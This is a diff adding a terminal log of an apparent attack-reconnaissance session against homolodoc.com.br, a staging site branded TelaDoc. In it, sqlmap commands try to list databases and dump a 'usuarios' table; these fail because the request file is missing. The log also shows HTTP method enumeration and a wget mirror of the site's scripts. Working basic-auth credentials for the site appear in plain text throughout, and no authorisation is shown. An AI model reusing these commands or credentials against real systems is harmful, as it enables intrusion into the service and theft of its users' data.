@@ -1,0 +1,253 @@
+(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# sqlmap -r req.txt \
+  --auth-type=BASIC \
+  --auth-cred="morandin:devops" \
+  --batch \
+  --dbs \
+  --threads=10
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.10#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:45:07 /2025-11-11/
+
+[14:45:07] [CRITICAL] specified HTTP request file 'req.txt' does not exist
+
+[*] ending @ 14:45:07 /2025-11-11/
+
+                                                                                                            
+┌──(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# sqlmap -r req.txt \
+  --auth-type=BASIC \
+  --auth-cred="morandin:devops" \
+  -D nome_database \
+  --tables
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.10#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:45:22 /2025-11-11/
+
+[14:45:22] [CRITICAL] specified HTTP request file 'req.txt' does not exist
+
+[*] ending @ 14:45:22 /2025-11-11/
+
+                                                                                                            
+┌──(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# sqlmap -r req.txt \
+  --auth-type=BASIC \
+  --auth-cred="morandin:devops" \
+  -D nome_database \
+  -T usuarios \
+  --dump
+        ___
+       __H__                                                                                                
+ ___ ___[(]_____ ___ ___  {1.9.10#stable}                                                                   
+|_ -| . [(]     | .'| . |                                                                                   
+|___|_  [.]_|_|_|__,|  _|                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:45:34 /2025-11-11/
+
+[14:45:34] [CRITICAL] specified HTTP request file 'req.txt' does not exist
+
+[*] ending @ 14:45:34 /2025-11-11/
+
+                                                                                                            
+┌──(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# curl -k http://homolodoc.com.br 
+<html>
+<head><title>308 Permanent Redirect</title></head>
+<body>
+<center><h1>308 Permanent Redirect</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+                                                                                                            
+┌──(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# for method in GET POST PUT DELETE OPTIONS HEAD TRACE PATCH; do echo -n "$method: "; curl -X $method -u "morandin:devops" -s -o /dev/null -w "%{http_code}\n" https://homolodoc.com.br; done
+
+GET: 200
+POST: 405
+PUT: 405
+DELETE: 405
+OPTIONS: 405
+HEAD: 200
+TRACE: 405
+PATCH: 405
+                                                                                                            
+┌──(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# curl -u "morandin:devops" https://homolodoc.com.br | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1281  100  1281    0     0   1318      0 --:--:-- --:--:-- --:--:--  1317
+https://fonts.googleapis.com/css?family=Material
+https://fonts.googleapis.com/css?family=Montserrat
+https://fonts.googleapis.com/css?family=Roboto
+https://www.google.com/recaptcha/api.js
+                                                                                                            
+┌──(root㉿nh3g)-[~/teladoc/homolodoc.com.br/js]
+└─# wget --user=morandin --password=devops -r -np -k https://homolodoc.com.br
+
+--2025-11-11 14:46:38--  https://homolodoc.com.br/
+Resolvendo homolodoc.com.br (homolodoc.com.br)... 35.224.189.206
+Conectando-se a homolodoc.com.br (homolodoc.com.br)|35.224.189.206|:443... conectado.
+A requisição HTTP foi enviada, aguardando resposta... 401 Unauthorized
+Autenticação selecionada: Basic realm="Authentication Required - TelaDoc"
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1281 (1,3K) [text/html]
+Salvando em: “homolodoc.com.br/index.html”
+
+homolodoc.com.br/index.htm 100%[========================================>]   1,25K  --.-KB/s    em 0s      
+
+2025-11-11 14:46:39 (31,2 MB/s) - “homolodoc.com.br/index.html” salvo [1281/1281]
+
+Carregando robots.txt; por favor ignore qualquer erro.
+--2025-11-11 14:46:39--  https://homolodoc.com.br/robots.txt
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1281 (1,3K) [text/html]
+Salvando em: “homolodoc.com.br/robots.txt”
+
+homolodoc.com.br/robots.tx 100%[========================================>]   1,25K  --.-KB/s    em 0s      
+
+2025-11-11 14:46:39 (14,4 MB/s) - “homolodoc.com.br/robots.txt” salvo [1281/1281]
+
+--2025-11-11 14:46:39--  https://homolodoc.com.br/ruxitagentjs_ICA2SVfqru_10199200831173248.js
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1281 (1,3K) [text/html]
+Salvando em: “homolodoc.com.br/ruxitagentjs_ICA2SVfqru_10199200831173248.js”
+
+homolodoc.com.br/ruxitagen 100%[========================================>]   1,25K  --.-KB/s    em 0s      
+
+2025-11-11 14:46:40 (13,1 MB/s) - “homolodoc.com.br/ruxitagentjs_ICA2SVfqru_10199200831173248.js” salvo [1281/1281]
+
+--2025-11-11 14:46:40--  https://homolodoc.com.br/css/app.7b1b0906.css
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 292940 (286K) [text/css]
+Salvando em: “homolodoc.com.br/css/app.7b1b0906.css”
+
+homolodoc.com.br/css/app.7 100%[========================================>] 286,07K   150KB/s    em 1,9s    
+
+2025-11-11 14:46:42 (150 KB/s) - “homolodoc.com.br/css/app.7b1b0906.css” salvo [292940/292940]
+
+--2025-11-11 14:46:42--  https://homolodoc.com.br/css/chunk-vendors.96683755.css
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1120567 (1,1M) [text/css]
+Salvando em: “homolodoc.com.br/css/chunk-vendors.96683755.css”
+
+homolodoc.com.br/css/chunk 100%[========================================>]   1,07M   247KB/s    em 4,5s    
+
+2025-11-11 14:46:46 (244 KB/s) - “homolodoc.com.br/css/chunk-vendors.96683755.css” salvo [1120567/1120567]
+
+--2025-11-11 14:46:46--  https://homolodoc.com.br/js/app.faa9c175.js
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 3475479 (3,3M) [application/javascript]
+Salvando em: “homolodoc.com.br/js/app.faa9c175.js”
+
+homolodoc.com.br/js/app.fa 100%[========================================>]   3,31M   897KB/s    em 3,9s    
+
+2025-11-11 14:46:51 (873 KB/s) - “homolodoc.com.br/js/app.faa9c175.js” salvo [3475479/3475479]
+
+--2025-11-11 14:46:51--  https://homolodoc.com.br/js/chunk-vendors.fa9a1aea.js
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 4678623 (4,5M) [application/javascript]
+Salvando em: “homolodoc.com.br/js/chunk-vendors.fa9a1aea.js”
+
+homolodoc.com.br/js/chunk- 100%[========================================>]   4,46M  2,24MB/s    em 2,0s    
+
+2025-11-11 14:46:53 (2,24 MB/s) - “homolodoc.com.br/js/chunk-vendors.fa9a1aea.js” salvo [4678623/4678623]
+
+--2025-11-11 14:46:53--  https://homolodoc.com.br/img/ic_sidebar_highlight.8d70e748.svg
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 606 [image/svg+xml]
+Salvando em: “homolodoc.com.br/img/ic_sidebar_highlight.8d70e748.svg”
+
+homolodoc.com.br/img/ic_si 100%[========================================>]     606  --.-KB/s    em 0s      
+
+2025-11-11 14:46:53 (8,90 MB/s) - “homolodoc.com.br/img/ic_sidebar_highlight.8d70e748.svg” salvo [606/606]
+
+--2025-11-11 14:46:53--  https://homolodoc.com.br/fonts/materialdesignicons-webfont.9c4a470c.eot
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1223392 (1,2M) [application/vnd.ms-fontobject]
+Salvando em: “homolodoc.com.br/fonts/materialdesignicons-webfont.9c4a470c.eot”
+
+homolodoc.com.br/fonts/mat 100%[========================================>]   1,17M  2,96MB/s    em 0,4s    
+
+2025-11-11 14:46:53 (2,96 MB/s) - “homolodoc.com.br/fonts/materialdesignicons-webfont.9c4a470c.eot” salvo [1223392/1223392]
+
+--2025-11-11 14:46:53--  https://homolodoc.com.br/fonts/materialdesignicons-webfont.9c4a470c.eot?
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1223392 (1,2M) [application/vnd.ms-fontobject]
+Salvando em: “homolodoc.com.br/fonts/materialdesignicons-webfont.9c4a470c.eot?”
+
+homolodoc.com.br/fonts/mat 100%[========================================>]   1,17M  3,45MB/s    em 0,3s    
+
+2025-11-11 14:46:54 (3,45 MB/s) - “homolodoc.com.br/fonts/materialdesignicons-webfont.9c4a470c.eot?” salvo [1223392/1223392]
+
+--2025-11-11 14:46:54--  https://homolodoc.com.br/fonts/materialdesignicons-webfont.66e43f0f.woff2
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 381688 (373K) [font/woff2]
+Salvando em: “homolodoc.com.br/fonts/materialdesignicons-webfont.66e43f0f.woff2”
+
+homolodoc.com.br/fonts/mat 100%[========================================>] 372,74K  --.-KB/s    em 0,03s   
+
+2025-11-11 14:46:54 (13,0 MB/s) - “homolodoc.com.br/fonts/materialdesignicons-webfont.66e43f0f.woff2” salvo [381688/381688]
+
+--2025-11-11 14:46:54--  https://homolodoc.com.br/fonts/materialdesignicons-webfont.c2df65ff.woff
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 553704 (541K) [font/woff]
+Salvando em: “homolodoc.com.br/fonts/materialdesignicons-webfont.c2df65ff.woff”
+
+homolodoc.com.br/fonts/mat 100%[========================================>] 540,73K  --.-KB/s    em 0,04s   
+
+2025-11-11 14:46:54 (13,1 MB/s) - “homolodoc.com.br/fonts/materialdesignicons-webfont.c2df65ff.woff” salvo [553704/553704]
+
+--2025-11-11 14:46:54--  https://homolodoc.com.br/fonts/materialdesignicons-webfont.e9f2f143.ttf
+Reaproveitando a conexão existente para homolodoc.com.br:443.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 1223172 (1,2M) [application/octet-stream]
+Salvando em: “homolodoc.com.br/fonts/materialdesignicons-webfont.e9f2f143.ttf”
+
+homolodoc.com.br/fonts/mat 100%[========================================>]   1,17M  6,06MB/s    em 0,2s    
+
+2025-11-11 14:46:55 (6,06 MB/s) - “homolodoc.com.br/fonts/materialdesignicons-webfont.e9f2f143.ttf” salvo [1223172/1223172]
+
+FINALIZADO --2025-11-11 14:46:55--
+Tempo total decorrido: 16s
+Baixados: 13 arquivos, 14M em 13s (1,02 MB/s)
+Convertendo links em homolodoc.com.br/index.html... 9.
+9-0
+Convertendo links em homolodoc.com.br/ruxitagentjs_ICA2SVfqru_10199200831173248.js... 9.
+9-0
+Convertendo links em homolodoc.com.br/robots.txt... 9.
+9-0
+Convertendo links em homolodoc.com.br/css/app.7b1b0906.css... 1.
+1-0
+Convertendo links em homolodoc.com.br/css/chunk-vendors.96683755.css... 5.
+5-0
+Links convertidos em 5 arquivos em 0,03 segundos.
